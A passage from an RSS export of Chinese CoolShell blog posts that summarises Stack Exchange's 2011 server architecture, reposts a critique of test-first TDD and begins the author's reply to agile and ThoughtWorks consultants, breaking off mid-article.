<p>近日，Stack Exchange系统管理员blog上发布了一篇关于<a href="http://blog.serverfault.com/post/stack-exchanges-architecture-in-bullet-points/" target="_blank">Stack Exchange的架构一瞥</a>，其包括了Stack Overflow, Server Fault 和 Super User的 Stack Exchange 网络。注意最后一个关于人员的配置。希望能给大家一些相关的参考。</p>
<div id="ez-toc-container" class="ez-toc-v2_0_17 counter-hierarchy counter-decimal ez-toc-grey">
<div class="ez-toc-title-container">
<p class="ez-toc-title">目录</p>
<span class="ez-toc-title-toggle"></span>
</div>
<nav><ul class="ez-toc-list ez-toc-list-level-1">
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-1" href="#%E7%BD%91%E7%BB%9C%E6%B5%81%E9%87%8F" title="网络流量">网络流量</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-2" href="#%E6%95%B0%E6%8D%AE%E4%B8%AD%E5%BF%83" title="数据中心">数据中心</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-3" href="#%E7%94%9F%E4%BA%A7%E6%9C%8D%E5%8A%A1%E5%99%A8" title="生产服务器">生产服务器</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-4" href="#%E4%BD%BF%E7%94%A8%E4%BA%86%E7%9A%84%E7%9B%B8%E5%85%B3%E7%9A%84%E8%BD%AF%E4%BB%B6%E5%92%8C%E6%8A%80%E6%9C%AF" title="使用了的相关的软件和技术">使用了的相关的软件和技术</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-5" href="#%E7%A8%8B%E5%BA%8F%E5%91%98%E5%92%8C%E7%B3%BB%E7%BB%9F%E7%AE%A1%E7%90%86%E5%91%98" title="程序员和系统管理员">程序员和系统管理员</a></li>
</ul></nav>
</div>
<h4>
<span class="ez-toc-section" id="%E7%BD%91%E7%BB%9C%E6%B5%81%E9%87%8F"></span>网络流量<span class="ez-toc-section-end"></span>
</h4>
<ul>
<li>每月9千5百万个PV</li>
<li>每秒800 HTTP 请求</li>
<li>每秒180 DNS 请求</li>
<li>每秒55Mb 的带宽</li>
</ul>
<h4>
<span class="ez-toc-section" id="%E6%95%B0%E6%8D%AE%E4%B8%AD%E5%BF%83"></span>数据中心<span class="ez-toc-section-end"></span>
</h4>
<ul>
<li>1 机柜 位于俄勒冈的 <a href="http://www.peakinternet.com/">Peak Internet</a> (用于<a href="https://chat.stackexchange.com/">chat</a> 和<a href="https://data.stackexchange.com/">Data Explorer</a>)</li>
<li>2 机框 位于 纽约的 <a href="http://www.peer1.com/">Peer 1</a> ( 用于其它的 Stack Exchange Network)</li>
</ul>
<p><span id="more-3721"></span></p>
<h4>
<span class="ez-toc-section" id="%E7%94%9F%E4%BA%A7%E6%9C%8D%E5%8A%A1%E5%99%A8"></span>生产服务器<span class="ez-toc-section-end"></span>
</h4>
<ul>
<li>12 Web Servers (Windows Server 2008 R2)</li>
<li>2 Database Servers (Windows Server 2008 R2 and SQL Server 2008 R2)</li>
<li>2 Load Balancers (Ubuntu Server and HAProxy)</li>
<li>2 Caching Servers (Redis on CentOS)</li>
<li>1 Router / Firewall (Ubuntu Server)</li>
<li>3 DNS Servers (Bind on CentOS)</li>
</ul>
<p>(生产服务器不含故障备份和管理服务器)</p>
<h4>
<span class="ez-toc-section" id="%E4%BD%BF%E7%94%A8%E4%BA%86%E7%9A%84%E7%9B%B8%E5%85%B3%E7%9A%84%E8%BD%AF%E4%BB%B6%E5%92%8C%E6%8A%80%E6%9C%AF"></span>使用了的相关的软件和技术<span class="ez-toc-section-end"></span>
</h4>
<ul>
<li><a href="https://www.microsoft.com/net/">C# / .NET</a></li>
<li><a href="https://www.microsoft.com/windowsserver2008/en/us/default.aspx">Windows Server 2008 R2</a></li>
<li><a href="https://www.microsoft.com/sqlserver/en/us/default.aspx">SQL Server 2008 R2</a></li>
<li><a href="https://www.ubuntu.com/server">Ubuntu Server</a></li>
<li><a href="https://www.centos.org/">CentOS</a></li>
<li>
<a href="http://haproxy.1wt.eu/">HAProxy</a> 用于负载均衡</li>
<li>
<a href="http://redis.io/">Redis</a> 用于缓存</li>
<li>
<a href="https://sourceforge.net/projects/ccnet/">CruiseControl.NET</a> 用于做builds</li>
<li>
<a href="https://lucene.apache.org/lucene.net/">Lucene.NET</a> 用于搜索</li>
<li>
<a href="http://www.bacula.org/en/">Bacula</a> 用于做备份</li>
<li>
<a href="http://www.nagios.org/">Nagios</a> (with n2rrd and drraw plugins) 用于系统监控</li>
<li>
<a href="http://www.splunk.com/">Splunk</a> 用于日志</li>
<li>
<a href="https://www.red-gate.com/products/dba/sql-monitor/">SQL Monitor from Red Gate</a> 用于监控SQL Server</li>
<li>
<a href="http://mercurial.selenic.com/">Mercurial</a> / <a href="https://www.fogcreek.com/kiln/">Kiln</a> 用于源码管理</li>
<li>
<a href="http://www.isc.org/software/bind">Bind</a> 用于 DNS</li>
</ul>
<h4>
<span class="ez-toc-section" id="%E7%A8%8B%E5%BA%8F%E5%91%98%E5%92%8C%E7%B3%BB%E7%BB%9F%E7%AE%A1%E7%90%86%E5%91%98"></span>程序员和系统管理员<span class="ez-toc-section-end"></span>
</h4>
<ul>
<li>14 程序员</li>
<li>2 系统管理员</li>
</ul>
<p><span>（全文完）</span></p>
<p align="center"><img alt="image placeholder" > <img alt="image placeholder" > <br>关注CoolShell微信公众账号和微信小程序</p>
<div style="margin-top: 15px; font-size: 11px;color: #cc0000;">
<p align="center"><strong>（转载本站文章请注明作者和出处 <a href="https://coolshell.cn/">酷 壳 – CoolShell</a> ，请勿用于任何商业用途）</strong></p>
</div>
<div style="text-align:center;padding:0px;font-size: 14px;margin-bottom: 50px;">——=== <b>访问 <a href="https://coolshell.cn/404/" target="_blank">酷壳404页面</a> 寻找遗失儿童。</b> ===——</div>
<div class="wp_rp_wrap  wp_rp_vertical_m" id="wp_rp_first"><div class="wp_rp_content">
<h3 class="related_post_title">相关文章</h3>
<ul class="related_post wp_rp">
<li>
<a href="https://coolshell.cn/articles/5075.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/5075.html" class="wp_rp_title">你确信你了解时间吗？</a>
</li>
<li>
<a href="https://coolshell.cn/articles/4939.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/4939.html" class="wp_rp_title">Quora使用到的技术</a>
</li>
<li>
<a href="https://coolshell.cn/articles/4549.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/4549.html" class="wp_rp_title">Facebook 的系统架构</a>
</li>
<li>
<a href="https://coolshell.cn/articles/2529.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/2529.html" class="wp_rp_title">StackOverflow的404错误页</a>
</li>
<li>
<a href="https://coolshell.cn/articles/1242.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/1242.html" class="wp_rp_title">23,148,855,308,184,500</a>
</li>
<li>
<a href="https://coolshell.cn/articles/10975.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/10975.html" class="wp_rp_title">一个“蝇量级” C 语言协程库</a>
</li>
</ul>
</div></div>
<div id="post-ratings-3721" class="post-ratings" itemscope itemtype="http://schema.org/Article" data-nonce="367f63923b">
<img alt="image placeholder" ><img alt="image placeholder" ><img alt="image placeholder" ><img alt="image placeholder" ><img alt="image placeholder" > (<strong>5</strong> 人打了分，平均分： <strong>3.40</strong> )<br><span class="post-ratings-text" id="ratings_3721_text"></span><meta itemprop="name" content="Stack Exchange 的架构">
<meta itemprop="headline" content="Stack Exchange 的架构">
<meta itemprop="description" content="近日，Stack Exchange系统管理员blog上发布了一篇关于Stack Exchange的架构一瞥，其包括了Stack Overflow, Server Fault 和 Super User的 Stack Exchange 网络。注意最后一个关于人员的配置。希望能给大家一些相关的参考。
网络流量

	每月9千5百万个PV
	每秒800 HTTP 请求
	每秒180 DNS 请求...">
<meta itemprop="datePublished" content="2011-02-23T13:31:04+08:00">
<meta itemprop="dateModified" content="2011-02-23T13:51:53+08:00">
<meta itemprop="url" content="https://coolshell.cn/articles/3721.html">
<meta itemprop="author" content="陈皓">
<meta itemprop="mainEntityOfPage" content="https://coolshell.cn/articles/3721.html">
<div style="display: none;" itemprop="publisher" itemscope itemtype="https://schema.org/Organization">
<meta itemprop="name" content="酷 壳 - CoolShell">
<meta itemprop="url" content="https://coolshell.cn">
<div itemprop="logo" itemscope itemtype="https://schema.org/ImageObject"><meta itemprop="url" content=""></div>
</div>
<div style="display: none;" itemprop="aggregateRating" itemscope itemtype="http://schema.org/AggregateRating">
<meta itemprop="bestRating" content="5">
<meta itemprop="worstRating" content="1">
<meta itemprop="ratingValue" content="3.4">
<meta itemprop="ratingCount" content="5">
</div>
</div>
<div id="post-ratings-3721-loading" class="post-ratings-loading">
<img alt="image placeholder" >Loading...</div>
 ]]></content>
<pubDate>2011-02-23T13:31:04+08:00</pubDate>
<guid>https://coolshell.cn/articles/3721.html</guid>
<author><![CDATA[ 陈皓 ]]></author>
</item>
<item>
<title><![CDATA[ [转]TDD到底美还是不美？ ]]></title>
<link>https://coolshell.cn/articles/3766.html</link>
<content><![CDATA[ 
<div id="body_66167">
<p><span id="quote_66167"> </span></p>
<p><span style="font-size: 11pt;"><strong>下面的文章转自Todd Wei 的《<a href="https://www.cnblogs.com/weidagang2046/archive/2011/02/23/1963277.html" target="_blank">TDD到底美还是不美？</a>》，对于这篇文章，我个人能过透过作者的观点感受到他的项目中使用TDD的难点，同样可以感受到作者内心的纠结。不管怎么样，我能够感到作者Todd Wei在独立思考，独立思考总是好的，因为那是走向成熟的必要条件。(<span style="color: #800000;">另，大家可以移步过去看看相关的评论，挺有意思的</span>)</strong></span></p>
<p>————————————————————————————————————</p>
<p><span style="font-size: 10pt;">最近CoolShell上的一篇</span><a title="TDD并不是看上去的那么美" href="https://coolshell.cn/articles/3649.html"><span style="font-size: 10pt;">《TDD并不是看上去的那么美》</span></a><span style="font-size: 10pt;">引起了敏捷社区的高度关注和激励辩论。今天，InfoQ甚至专门举行了一个“虚拟座谈会”</span><a title="《TDD有多美》" href="http://www.infoq.com/cn/articles/virtual-panel-tdd"><span style="font-size: 10pt;">《TDD有多美？》</span></a><span style="font-size: 10pt;">，几位国内敏捷社区的名人专门就此问题展开了深入地讨论。不论结果如何，这个纯技术的探讨精神还是非常值得赞赏的。事件实际上可以简单地归纳为“一个有一定影响力的开发人员质疑TDD，一群敏捷社区名人对TDD进行解释和辩护”。现在，就让我坚定地站在CoolShell一边，为对TDD的质疑和批判添砖加瓦吧！</span></p>
</div>
<p><span style="font-size: 10pt;">TDD的核心理念是什么呢？第一是Specification by Example，即把测试用例作为表达需求的一种方式。传统的需求表达方式包括文档，Use Case等，而TDD强调通过测试用例来表达需求。另外，TDD的测试用例是黑盒的基于外部接口的，所以，它实际上又是对外部接口的设计。如何看待测试用例是TDD与传统测试的一个重要区别。“不把测试用例单纯地视为测试，而从需求和设计的角度来看测试用例”的理念本身是好的。另外，TDD的第二个理念是Test First，强调测试对于实现的驱动作用，先写测试用例，再实现和重构。在Specification by Example的理念下，Test First的实质是“先理解清楚需求，并做好外部接口设计，把它转化为测试用例，然后再来实现和重构”。 </span></p>
<p><span style="font-size: 10pt;">我认为，Specification by Example是不错的，因为测试用例作具有精确性，容易自动化的优点，这是传统的文档和Use Case在表达需求时所欠缺的地方。但</span><strong>Test First理念本身则有很大的问题</strong>，尤其“在没有测试用例失败之前，不要写任何一行代码”的极端方式则更是极端的错误。<br>
<span id="more-3766"></span></p>
<p><span id="quote_66167" style="font-size: 10pt;">如果测试用例是需求和设计，那么为什么不能先写出测试用例（即理解清楚需求做好外部接口设计）再来实现呢？这不是我们最熟悉的先需求再设计再编码吗？答案是：</span><span id="quote_66167" style="font-size: 10pt;"><strong>不能执行的测试用例（Test First）和能执行的测试用例有着天壤之别</strong>。不能执行的测试用例和写在纸上的文档相比对实现的指导意义不见得能好到哪里去！除非是一些很简单的情况下，在实际的软件开发中，你很难在没有执行测试用例的情况下写出真正符合最终需求的测试用例来。比如：你做一个页面，页面的效果需求和设计通常会在真正可以运行之后不断调整。如果片面强调测试对实现的驱动作用，那么实际上隐含了“需求可以在实现之前固定下来”的假设，这是非常不敏捷的和不现实的！我认为要做到真正的敏捷必须承认<strong>“需求无法在用户真正能运行看到效果之前明确下来“</strong>。由此可见，Test First和瀑布式思想没有区别，都强调需求先于实现，而忽略了软件需求的产生是一个在实际运行中不断调整探索完善的过程。TDD无非是把需求分析的结果用测试用例表达，替代传统用文档表达需求，但从宏观上看，TDD和瀑布比是换汤不换药。除了简单情况，不存在脱离实现的需求，你能够在明确了需求之后就实现出一套linux系统吗？既然你根本无法实现一套linux系统，那么这样所谓的需求又有多大的意义呢？所以，能提出什么样的需求不能脱离你的实现能力。<strong>需求和实现之间不是简单的谁驱动谁，而是一种相互反馈的关系</strong>，这与需求用什么方式表达没有关系。到目前为主，我推崇的方式是快速实现，在实际运行中体验效果，不断优化探索和明确需求，当需求达到一个比较稳定的程度才编写测试用例将需求固化下来。</span></p>
<div>
<p><span id="quote_66167" style="font-size: 10pt;">上面的论述主要针对贴近用户的外部需求（如ATDD），下面我会进一步解释即使是在内部的单元测试级别TDD仍然有问题。我们还是首先从需求入手，思考一下单元的需求是哪里来的呢？答案是：需求来自于设计， 也就是说高层模块的内部设计产生了低层模块的需求。而这种内部设计具有很大的不稳定性，带有很多假设的成分，在没有进行集成测试的情况下，很难讲这种内部设计是否合理。实际项目开发通常会在集成运行之后不断调整内部的设计，即影响单元的需求。那么，如果是按测试驱动，首先按不成熟的内部设计把一个个单元需求编写成单元测试再来实现，实际上大大推迟了能进行集成测试的时间， 对于真正快速弄清需求稳定设计反而是不利的。假设最终还是所有单元都完成，然后开始运行集成或验收测试，这时候有两种可能：1.用户看到实际效果，决定调整需求；2.发现未集成前的很多假设不成立。不论是哪一种情况发生，以前所写的单元测试都面临着被废弃或必须修改的命运。实际上，多数与业务相关的单元测试用例比起集成或验收测试用例更加不稳定，因为它会受到所有其上层模块的需求和设计变动的影响。由于我们在不稳定的单元测试上浪费了大量的时间（按我的经验编写单元测试比编写实现更耗时），这就导致了迟迟无法进行集成看到实际效果，也没有办法敏捷地应对需求的调整。也就是说具有讽刺意味的，</span><span id="quote_66167" style="font-size: 10pt;"><strong>Test First理念居然是和敏捷理念矛盾的！</strong></span></p>
<p>所以，我认为TDD的理念Specification by Example没错，但Test First即“在实现之前把需求和外部接口设计转化成测试用例”的理念错了。真正符合实际开发情况的理念是“需求是在实际运行过程中根据效果不断探索调整得来的，不可能脱离实际运行写出真正符合最终需求的测试用例来”。所以，<strong>我们真正应该做的是尽快看到实际运行的效果</strong>，而测试作为固化的需求和设计是在看到效果之后。<strong>过度的TDD只会导致迟迟看不到实际运行效果，看到效果需要调整需求又会废掉或改掉一大堆的测试用例。</strong>实际上，越是外部的需求其变更带来的影响和代价越大，越是需要尽早明确。从宏观上看，<strong>TDD所谓的快速反馈实际上是加快内部反馈，延迟了外部反馈，这无异于本末倒置</strong>。而大量需要修改或作废的测试用例其实是一种很大的浪费，这和消除浪费的精益思想也是矛盾的！</p>
<div>
<p><span id="quote_66167"> </span></p>
<div><img alt="image placeholder" ></div>
</div>
</div>
<p><span id="quote_66167" style="font-size: 10pt;">上面这幅cost/length_of_feedback_cycle图是我们常见的用于说明敏捷方法比传统方法具有更短的反馈周期，更小代价的应对变化。从图中我们可以清晰的看到在验收测试中发现的需求错误导致的代价是最高的。如果验收测试往后推迟一点，发现错误的代价将按非线性地增长。上面我们已经论述了，任何方法都不可能消除验收测试后对需求的调整，因为这是需求产生的正常过程。我们唯一可以做的是尽可能地缩短验收测试的反馈周期，但是很不幸TDD大量的内部测试只会导致推迟验收测试的时间，从而大大增加代价。<br>
</span></p>
<div>
<div>
<span style="font-size: 10pt;">下面这段话来自于InfoQ文章</span><a title="《Mock不是测试的银弹》" href="http://www.infoq.com/cn/articles/thoughtworks-practice-partvi"><span style="font-size: 10pt;">《Mock不是测试的银弹》</span></a><span style="font-size: 10pt;">：“在使用JMock框架后测试编写起来更容易，运行速度更快，也更稳定，然而出乎意料的是产品质量并没有如我们所预期的随着不断添加 的测试而变得愈加健壮，虽然产品代码的单元测试覆盖率超过了80%，然而在发布前进行全面测试时，常常发现严重的功能缺陷而不得不一轮轮的修复缺陷、回归 测试。为什么编写了大量的测试还会频繁出现这些问题呢？ ”这描述的情况和我在实践中遇到的情况类似，不过很可惜文章并没有找到问题真正的原因。真正的原因不是什么Mock不Mock，而是TDD的单元测试是基于开发人员的假设，这些假设的测试即使全部通过代码覆盖率100%，到了集成测试发现假设根本不成立又怎能保证高质量？</span>
</div>
</div>
<p><span id="quote_66167" style="font-size: 10pt;">当然，我不是全盘否定TDD。TDD在某些需求特别固定的场合是适用的，尤其是与具体业务关系不大的需求，比如：写一个通用的数据结构，实现一个通用算法。TDD的先关注需求和思考外部接口设计的理念也对促进开发人员的抽象思维有很大益处。另外，TDD通常也具有较高的代码覆盖率。本文的主要观点在于：实际项目中，不要期望可以在实现之前完全明确需求，需求是在实际运行看到效果之后才逐步明确的；我们的开发过程必须能够敏捷地适应需求的变化，而TDD的Test First理念恰好与之矛盾。所以，对于TDD不了解的朋友，我建议应该学习和实践TDD，从而获得其益处；同时我也提醒TDD存在理论上的缺陷，这是在实践中需要特别留意的。</span></p>
<p><span style="font-size: 10pt;">(全文完)</span></p>
<p align="center"><img alt="image placeholder" > <img alt="image placeholder" > <br>关注CoolShell微信公众账号和微信小程序</p>
<div style="margin-top: 15px; font-size: 11px;color: #cc0000;">
<p align="center"><strong>（转载本站文章请注明作者和出处 <a href="https://coolshell.cn/">酷 壳 – CoolShell</a> ，请勿用于任何商业用途）</strong></p>
</div>
<div style="text-align:center;padding:0px;font-size: 14px;margin-bottom: 50px;">——=== <b>访问 <a href="https://coolshell.cn/404/" target="_blank">酷壳404页面</a> 寻找遗失儿童。</b> ===——</div>
<div class="wp_rp_wrap  wp_rp_vertical_m" id="wp_rp_first"><div class="wp_rp_content">
<h3 class="related_post_title">相关文章</h3>
<ul class="related_post wp_rp">
<li>
<a href="https://coolshell.cn/articles/8209.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/8209.html" class="wp_rp_title">“单元测试要做多细？”</a>
</li>
<li>
<a href="https://coolshell.cn/articles/5531.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/5531.html" class="wp_rp_title">Test-Driven Development？别逗了</a>
</li>
<li>
<a href="https://coolshell.cn/articles/5143.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/5143.html" class="wp_rp_title">在新浪微博上关于敏捷的一些讨论</a>
</li>
<li>
<a href="https://coolshell.cn/articles/4891.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/4891.html" class="wp_rp_title">Bob大叔和Jim Coplien对TDD的论战</a>
</li>
<li>
<a href="https://coolshell.cn/articles/3778.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/3778.html" class="wp_rp_title">敏捷水管工</a>
</li>
<li>
<a href="https://coolshell.cn/articles/3745.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/3745.html" class="wp_rp_title">再谈敏捷和ThoughtWorks中国咨询师</a>
</li>
</ul>
</div></div>
<div id="post-ratings-3766" class="post-ratings" itemscope itemtype="http://schema.org/Article" data-nonce="2bf8e75f01">
<img alt="image placeholder" ><img alt="image placeholder" ><img alt="image placeholder" ><img alt="image placeholder" ><img alt="image placeholder" > (<strong>14</strong> 人打了分，平均分： <strong>3.79</strong> )<br><span class="post-ratings-text" id="ratings_3766_text"></span><meta itemprop="name" content="[转]TDD到底美还是不美？">
<meta itemprop="headline" content="[转]TDD到底美还是不美？">
<meta itemprop="description" content="

 

下面的文章转自Todd Wei 的《TDD到底美还是不美？》，对于这篇文章，我个人能过透过作者的观点感受到他的项目中使用TDD的难点，同样可以感受到作者内心的纠结。不管怎么样，我能够感到作者Todd Wei在独立思考，独立思考总是好的，因为那是走向成熟的必要条件。(另，大家可以移步过去看看相关的评论，挺有意思的)

——————————————————————————————...">
<meta itemprop="datePublished" content="2011-02-24T15:41:24+08:00">
<meta itemprop="dateModified" content="2011-02-24T15:41:24+08:00">
<meta itemprop="url" content="https://coolshell.cn/articles/3766.html">
<meta itemprop="author" content="陈皓">
<meta itemprop="mainEntityOfPage" content="https://coolshell.cn/articles/3766.html">
<div style="display: none;" itemprop="publisher" itemscope itemtype="https://schema.org/Organization">
<meta itemprop="name" content="酷 壳 - CoolShell">
<meta itemprop="url" content="https://coolshell.cn">
<div itemprop="logo" itemscope itemtype="https://schema.org/ImageObject"><meta itemprop="url" content=""></div>
</div>
<div style="display: none;" itemprop="aggregateRating" itemscope itemtype="http://schema.org/AggregateRating">
<meta itemprop="bestRating" content="5">
<meta itemprop="worstRating" content="1">
<meta itemprop="ratingValue" content="3.79">
<meta itemprop="ratingCount" content="14">
</div>
</div>
<div id="post-ratings-3766-loading" class="post-ratings-loading">
<img alt="image placeholder" >Loading...</div>
 ]]></content>
<pubDate>2011-02-24T15:41:24+08:00</pubDate>
<guid>https://coolshell.cn/articles/3766.html</guid>
<author><![CDATA[ 陈皓 ]]></author>
</item>
<item>
<title><![CDATA[ 再谈敏捷和ThoughtWorks中国咨询师 ]]></title>
<link>https://coolshell.cn/articles/3745.html</link>
<content><![CDATA[ 
<div id="ez-toc-container" class="ez-toc-v2_0_17 counter-hierarchy counter-decimal ez-toc-grey">
<div class="ez-toc-title-container">
<p class="ez-toc-title">目录</p>
<span class="ez-toc-title-toggle"></span>
</div>
<nav><ul class="ez-toc-list ez-toc-list-level-1">
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-1" href="#%E5%89%8D%E8%A8%80%E8%AF%B4%E6%98%8E" title="前言说明">前言说明</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-2" href="#%E5%9F%BA%E6%9C%AC%E8%A7%82%E7%82%B9" title="基本观点">基本观点</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-3" href="#%E5%AF%B9%E4%BA%8E%E6%95%8F%E6%8D%B7%E6%96%B9%E6%B3%95%E8%AE%BA%E7%9A%84%E8%A7%82%E7%82%B9" title="对于敏捷方法论的观点">对于敏捷方法论的观点</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-4" href="#%E5%AF%B9%E4%BA%8EThoughtWorks%E5%92%A8%E8%AF%A2%E5%B8%88%E7%9A%84%E6%89%B9%E8%AF%84%E8%A7%82%E7%82%B9" title="对于ThoughtWorks咨询师的批评观点">对于ThoughtWorks咨询师的批评观点</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-5" href="#%E5%85%B3%E4%BA%8EThoughtWorks%E5%92%8CInfoQ%E7%BB%99%E6%88%91%E7%9A%84%E4%BF%A1" title="关于ThoughtWorks和InfoQ给我的信">关于ThoughtWorks和InfoQ给我的信</a></li>
</ul></nav>
</div>
<h4>
<span class="ez-toc-section" id="%E5%89%8D%E8%A8%80%E8%AF%B4%E6%98%8E"></span>前言说明<span class="ez-toc-section-end"></span>
</h4>
<p>之所以用了“再”，是因为之前的两篇文章——</p>
<ul>
<li>我在《<a title="那些炒作过度的技术和概念" href="https://coolshell.cn/articles/3609.html">那些炒作过度的技术和概念</a>》中批评了ThoughtWorks中国咨询师的咨询方法是以一种接近于教条、炒作、洗脑和电视购物的方法（虽然我心底觉得有时候有时候更像传销），当然，批评是没有意义的，所以我也给了中国ThoughtWorks那些年轻的咨询师们一些我认为有建设性的建议。</li>
</ul>
<ul>
<li>我在《<a title="TDD并不是看上去的那么美" href="https://coolshell.cn/articles/3649.html">TDD并不是看上去的那么美</a>》一文中列举了一些在实际中使用TDD可能会出现的问题和难题，以此来告诉大家在使用TDD时需要注意的东西。就像是在《<a href="https://coolshell.cn/articles/16.html" target="_blank">结对编程的利与弊</a>》说的一样，只有真正知道一件事情的利弊，你才能用好它。</li>
</ul>
<p>当然，这两篇文章都不可避免得招来了ThoughtWorks咨询师和Agile信仰者们的很多回复，我也有开始沉不住气回复了很多，当然，有一半以上的不是学术上的讨论，而是对我个人的攻击。甚至，在这两篇文章发布后，酷壳（CoolShell.cn）受到<a href="https://coolshell.cn/articles/3686.html" target="_blank">持续性的黑客攻击</a>。</p>
<p>本来已经过去的事，今天却又发现这两篇文章的访问量和评论又上来了，才发现原来是InfoQ的这篇文章——《<a href="http://www.infoq.com/cn/articles/virtual-panel-tdd" target="_blank">虚拟座谈会：TDD有多美？</a>》，加上很多我在评论中的观点，以及ThoughtWorks和InfoQ之前给我的来信中谈到的一些观点。我很不自然地想把我的一些观点总结并罗列在这里。主要分成四块—— 1）<strong>我对整个事情的基本观点</strong>，2）<strong>对于方法论的观点，3）对于TW中国咨询师的观点</strong>，4）<strong>还有和TW和InfoQ住来信件中的观点</strong><strong>。</strong></p>
<p><strong>————————————————</strong></p>
<h4>
<span class="ez-toc-section" id="%E5%9F%BA%E6%9C%AC%E8%A7%82%E7%82%B9"></span>基本观点<span class="ez-toc-section-end"></span>
</h4>
<p>首先，我想说明一下我的基本观点。</p>
<p><span id="more-3745"></span></p>
<p>一、<strong>真金不怕火炼</strong>。我就像大家一样，平时总是会或多或少的埋怨点什么。大街上有人随便做个事，你会和他较真吗？不会。这个事也一样，我就像大家茶余饭后批评房价和物价一样，你们没有必要那么较真，不值得这样小题大作（除非你们真的心虚了），如果你做得好的话，真金不怕火炼，我这点批评算得了什么。<strong>你们玩的是“敏捷”不是“敏感”</strong>。</p>
<p>二、<strong>从正反面思考</strong>。我和大家一样，喜欢思考，喜欢从正面和反面一同思考问题，我有质疑的癖好，我希望大家都有这样的思考方式。注意，<strong>质疑的结果不是为了质疑而质疑，而是去寻找完整认识的一种方法</strong>。</p>
<p>三、<strong>观点的自由</strong>。我不是一棍大打死一片的人，我不完全否定敏捷（我的那两篇文章都有一再说明过了），同时我也不会完全同意敏捷。我不会因为敏捷有不好的地方我一棍子打死，我同样不会因为敏捷的好处就大唱赞歌。任何事物都有好有坏，我寻求的是自由地发表我的观点。<strong>我反对观点的极端，但我追求观点的自由</strong>。</p>
<p><strong>四、观点的不同。</strong>观点只有不同才会让人思路完整，观点只有不同才会迸发出火花，世界的进展正是因为有不同的观点。如果敏捷的咨询师和信仰者们不接受不同观点，不接受批评，那么你们将无法进步和发展，如果你们妄图让所有人都持认可敏捷的和谐观点，那么你们将会变得邪恶。<strong>没有批评，赞美也会变得没有意义</strong>。</p>
<p><strong>————————————————</strong></p>
<h4>
<span class="ez-toc-section" id="%E5%AF%B9%E4%BA%8E%E6%95%8F%E6%8D%B7%E6%96%B9%E6%B3%95%E8%AE%BA%E7%9A%84%E8%A7%82%E7%82%B9"></span>对于敏捷方法论的观点<span class="ez-toc-section-end"></span>
</h4>
<p>一、<strong>没有好的方法，只有适不适合的方法</strong>。正如没有好的设计，只有适不适合的设计一样。喜欢足球的朋友都知道，世界级的足球队中，巴西队玩的是个人艺术足球，德国队玩的是整体和纪律性足球，意大利玩的是防守型足球，但是他们都有夺世界杯冠军的实力，如果你硬要让巴西队去整意大利的风格，或是让德国整巴西的风格，那就悲剧了。<strong>敏捷是不会是适合所有人所有项目的，就像不是所有的人都有运动的天赋一样</strong>。</p>
<p>二、<strong>软件开发的中心是人和项目，而不是方法</strong>。千万不要把方法放在中心，改变项目的性质和人的习惯去适应这个方法。正确的方法是，以人和项目为中心，了解项目中所有人的想法和做事的风格，以及项目的性质，从而决定采用什么样的方法。大家可以看看<a href="http://www.infoq.com/cn/articles/virtual-panel-tdd" target="_blank">InfoQ上那几个“专家”关于TDD的对话</a>，除了Google的测试经理外，其它人从到到尾谈的都是TDD方法，谈的都是如果要TDD，人应该怎么怎么样。<strong>这就是敏捷最大的问题——教条主义横行，以方法论为中心横行</strong>。我批判的就是这个！</p>
<p>三、<strong>好的方法不是讲出来的，而是在实践中改善出来的</strong>。好的方法不用去讲出来的，而是从团队内部自发出来的。如果敏捷方法论很不错的话，那么应该会在现实中体现出来。<strong>真正好的方法是团队内部根据自身情况在不同的项目上使用的不同的方法</strong>。（注：请不要使用XUnit, Spring，ANT等程序框架举例，因为那些项目的用户是程序员）</p>
<p>四，<strong>方法论不是一种理论</strong>。敏捷的鼓吹者说，TDD让你更关注设计，TDD更能了解需求。理论上，你可以把TDD拔到这样的高度，甚至更高的高度。可是具体实践上呢，你会发现在有压力的状态下你的程序员关注得更多的是测试过不过，在和用户沟通的时候，你会发现，根本没有一种好的方法论可以把需求完全搞清。如果TDD可以完全搞清需求，还要迭代干什么，直接waterfall了（其它关于TDD的观点请看我的文章《<a title="TDD并不是看上去的那么美" href="https://coolshell.cn/articles/3649.html">TDD并不是看上去的那么美</a>》）理论和实际的差别的很大的。</p>
<p><strong>————————————————</strong></p>
<h4>
<span class="ez-toc-section" id="%E5%AF%B9%E4%BA%8EThoughtWorks%E5%92%A8%E8%AF%A2%E5%B8%88%E7%9A%84%E6%89%B9%E8%AF%84%E8%A7%82%E7%82%B9"></span><strong>对于ThoughtWorks咨询师的批评观点</strong><span class="ez-toc-section-end"></span>
</h4>
